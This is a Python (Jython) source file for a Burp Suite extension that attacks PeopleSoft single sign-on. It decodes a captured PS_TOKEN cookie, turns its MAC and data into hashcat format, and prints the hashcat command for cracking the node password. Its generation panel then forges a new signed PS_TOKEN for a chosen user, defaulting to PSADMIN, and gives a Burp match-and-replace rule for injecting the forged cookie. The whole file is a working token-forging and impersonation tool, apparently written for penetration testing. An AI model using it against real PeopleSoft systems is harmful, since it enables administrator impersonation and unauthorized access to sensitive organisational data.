from burp import IBurpExtender, ITab, IContextMenuFactory
from java.awt import Component, Font, Color, GridBagLayout, GridBagConstraints;
from java.util import ArrayList;
from java.util import List;
from javax.swing import JScrollPane, JLabel, JPanel, JTextArea, JButton, BorderFactory, JMenuItem;
from javax.swing import JSplitPane;
from javax.swing import SwingUtilities;
from javax.swing.border import Border;
import base64, zlib, hashlib, string

class BurpExtender(IBurpExtender, ITab, IContextMenuFactory):
    
    #
    # implement IBurpExtender
    #

    #global vars to access all the textboxes
    global btnDecode,btnGenerate
    global left_tb1, left_tb2, left_tb3, right_tb1, right_tb2, right_tb3

    

    #global vars to set the endian value
    global tmp1, tmp2, tmp3, tmp4, tmp7

    def registerExtenderCallbacks(self, callbacks):
        
        endianVal = 0

        def generateTextBox(defaultTxt, editable):
            sample = JTextArea(5,20)
            scrollPane1 = JScrollPane(sample)
            sample.setBounds(0,0,400,400)
            sample.setEditable(editable)
            sample.setLineWrap(True)
            sample.setWrapStyleWord(True)
            sample.setBorder(BorderFactory.createLineBorder(Color.BLACK))
            sample.setText(defaultTxt)

            return sample

        def decodeData(event):

            #Get Base64 token
            full_str=base64.b64decode(self._left_tb1.getText())


            sha_mac=full_str[44:64].encode('hex')
            inflate_data=full_str[76:]
            data=zlib.decompress( inflate_data )


            user_length = data[20]
            loc = 21
            tokenDetails = "User name :"+data[loc:loc+int(user_length.encode('hex'), 16)].replace("\x00","") + "\n"
            loc=loc+int(user_length.encode('hex'), 16)
            lang_length=data[loc]
            loc=loc+1

            tokenDetails += "Lang Code :" + data[loc:loc+int(lang_length.encode('hex'), 16)].replace("\x00","") + "\n"
            tmp1.setText(data[loc:loc+int(lang_length.encode('hex'), 16)].replace("\x00",""))
            loc=loc+int(lang_length.encode('hex'), 16)
            node_length=data[loc]
            loc=loc+1

            tokenDetails += "Node name :" + data[loc:loc+int(node_length.encode('hex'), 16)].replace("\x00","") + "\n"
            tmp2.setText(data[loc:loc+int(node_length.encode('hex'), 16)].replace("\x00",""))
            loc=loc+int(node_length.encode('hex'), 16)
            time_length=data[loc]
            loc=loc+1


            tokenDetails += "Creation time :" + data[loc:loc+int(time_length.encode('hex'), 16)].replace("\x00","")
            
            tmp = data[loc:loc+int(time_length.encode('hex'), 16)].replace("\x00","")
            datestamp = tmp[:len(tmp)-7]
            tmp3.setText(datestamp)
            # Determine if it's little or big endian
            if (data[4:8].encode('hex') == '04030201'):
                endianVal = 0
            else:
                endianVal = 1

            tmp4.setText(str(endianVal))
            hashcatFormat = sha_mac+":"+data.encode("hex")

            left_tb2.setText(tokenDetails)
            left_tb3.setText(hashcatFormat)

        def make_field(part, size):
            part=chr(len(part)+size)+part
            return part

        def generateToken(event):

            newtoken = ""

            endianVal = int(tmp4.getText())

            if endianVal == 1:
                username = right_tb2.getText().encode('utf_16_be') 
                nodepw = right_tb1.getText().encode('utf_16_le')
                lang = tmp1.getText().encode('utf_16_be')
                nodename = tmp2.getText().encode('utf_16_be')
                datestamp = (tmp3.getText() + '.164266').encode('utf_16_be')
                token_ver = "8.10".encode('utf_16_be')
                unknown_field = "N".encode('utf_16_be')

                uncompressed_data='\x01\x02\x03\x04\x00\x01\x00\x00\x00\x00\x02\xbc\x00\x00\x00\x00'+make_field(username,0)+make_field(lang,0)+make_field(nodename,0)+make_field(datestamp,0)+'\x00'
                uncompressed_field='\x00\x00\x00' + make_field(uncompressed_data,4)

                inflate_data=zlib.compress( uncompressed_field )

                sha1_mac= hashlib.sha1(uncompressed_field+nodepw).digest()
                
                uncompressed_length=chr(len(uncompressed_field))
                static_headers1='\x01\x02\x03\x04\x00\x01\x00\x00\x00\x00\x02\xbc\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x04\x53\x68\x64\x72\x02'+unknown_field+uncompressed_length+'\x08'+token_ver+'\x14'
                static_headers2='\x00\x05\x53\x64\x61\x74\x61'
                body='\x00\x00\x00'+make_field(static_headers2+make_field(inflate_data,0),4)
                token='\x00\x00\x00'+make_field(static_headers1+sha1_mac+body,4)

                newtoken = base64.b64encode(token)

            elif endianVal == 0:
                username = right_tb2.getText().encode('utf_16_le') 
                nodepw = right_tb1.getText().encode('utf_16_le')
                lang = tmp1.getText().encode('utf_16_le')
                nodename = tmp2.getText().encode('utf_16_le')
                datestamp = (tmp3.getText() + '.999543').encode('utf_16_le')
                token_ver = "8.10".encode('utf_16_le')
                unknown_field = "N".encode('utf_16_le')

                uncompressed_data='\x00\x00\x00\x04\x03\x02\x01\x01\x00\x00\x00\xbc\x02\x00\x00\x00\x00\x00\x00'+make_field(username,0)+make_field(lang,0)+make_field(nodename,0)+make_field(datestamp,0)+'\x00'
                uncompressed_field=make_field(uncompressed_data,1)

                inflate_data=zlib.compress( uncompressed_field )

                sha1_mac= hashlib.sha1(uncompressed_field+nodepw).digest()
                
                uncompressed_length=chr(len(uncompressed_field))

                static_headers1='\x00\x00\x00\x04\x03\x02\x01\x01\x00\x00\x00\xbc\x02\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x04\x00\x53\x68\x64\x72\x02'+unknown_field+uncompressed_length+'\x08'+token_ver+'\x14'
                static_headers2='\x00\x00\x00\x05\x00\x53\x64\x61\x74\x61'
                body=make_field(static_headers2+make_field(inflate_data,0),1)
                token=make_field(static_headers1+sha1_mac+body,1)

                newtoken = base64.b64encode(token)

            right_tb3.setText("PS_TOKEN="+newtoken+";")

        # keep a reference to our callbacks object
        self._callbacks = callbacks
        
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("PeopleSoft PSToken Processor")
        
        
        # main split pane
        self._splitpane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
        self._splitpane.setResizeWeight(0.5)


        c = GridBagConstraints()
        c.weightx = 1
        c.weighty = 1

        c.anchor = GridBagConstraints.NORTHWEST

        #Temp variables

        tmp1 = JLabel("tmp")
        tmp2 = JLabel("tmp")
        tmp3 = JLabel("tmp")
        tmp4 = JLabel("tmp")

        # add left panel
        panel1 = JPanel(GridBagLayout())
        header1 = JLabel("EXTRACTION")
        header1.setFont(Font("Myriad Pro",Font.BOLD,24))

        left_t1 = JLabel("PS_TOKEN Cookie")
        left_t2 = JLabel("Token Details")
        left_t3 = JLabel("Token Hash + Salt (Hashcat Format)")
        left_t4 = JLabel("Save this into a .hash file and run the following Hashcat command: hashcat -m 13500 <hashfile> <dictionary file>")

        self._left_tb1 = generateTextBox("Your PS_TOKEN value here",True)
        left_tb2 = generateTextBox("Token Details here",False)
        left_tb3 = generateTextBox("Hashcat format here",False)

        btnDecode = JButton("Decode",actionPerformed=decodeData)
        btnGenerate = JButton("Generate", actionPerformed=generateToken)
        #add right panel
        panel2 = JPanel(GridBagLayout())
        header2 = JLabel("GENERATION")
        header2.setFont(Font("Myriad Pro",Font.BOLD,24))

        right_t1 = JLabel("Node password")
        right_t2 = JLabel("New username")
        right_t3 = JLabel("New Base64 PS_TOKEN")
        right_t4 = JLabel("Match & Replace rule to modify PS_TOKEN (Type: Request Header, enable regex)")
        right_t5 = JLabel("Match rule: PS_TOKEN=[A-Za-z0-9\/\+]*;")
        right_t6 = JLabel("Replace: PS_TOKEN=<new generated PS_TOKEN>;")

        right_tb1 = generateTextBox("Password here",True)
        right_tb2 = generateTextBox("PSADMIN",True)
        right_tb3 = generateTextBox("Your new token here",False)

        panel1.add(header1,c)
        panel2.add(header2,c)

        c.gridx = 0
        c.gridy = 1
        panel1.add(left_t1,c)
        panel2.add(right_t1,c)
        c.gridy += 1
        panel1.add(self._left_tb1,c)
        panel2.add(right_tb1,c)

        c.gridy +=1
        panel1.add(left_t2,c)
        panel2.add(right_t2,c)
        c.gridy += 1
        panel1.add(left_tb2,c)
        panel2.add(right_tb2,c)        

        c.gridy += 1
        panel1.add(left_t3,c)
        panel2.add(right_t3,c)
        c.gridy += 1
        panel1.add(left_t4,c)
        panel2.add(right_t4,c) 
        c.gridy += 1
        panel1.add(left_tb3,c)
        panel2.add(right_t5,c)
        c.gridy += 1
        panel2.add(right_t6,c)
        c.gridy += 1
        panel2.add(right_tb3,c)
        c.gridy += 1
        panel1.add(btnDecode,c)
        panel2.add(btnGenerate,c)



        self._splitpane.setLeftComponent(panel1)
        self._splitpane.setRightComponent(panel2)


        
        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        #callbacks.customizeUiComponent(panel1)
        #callbacks.customizeUiComponent(scrollPane)
        
        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)

        #add option to do right-click
        callbacks.registerContextMenuFactory(self)
        
        return
        
    #
    # implement ITab
    #

    
    def getTabCaption(self):
        return "PSTOKEN-JYTHON"
    
    def getUiComponent(self):
        return self._splitpane

    def createMenuItems(self, invocation):

        def sendValue(e):
            bd = invocation.getSelectionBounds()

            res = ""

            if invocation.getInvocationContext() == 2:
                data = invocation.getSelectedMessages()[0].getRequest()
                for i in (data[bd[0]:bd[1]]):
                    res = res + chr(int(i))



            elif invocation.getInvocationContext() == 3:
                
                data = invocation.getSelectedMessages()[0].getRequest()
                for i in (data[bd[0]:bd[1]]):
                    res = res + chr(int(i))

            self._left_tb1.setText(res)

        menuList = []
        item = JMenuItem("Send to PSTOKEN",actionPerformed=sendValue)
        menuList.append(item)

        return menuList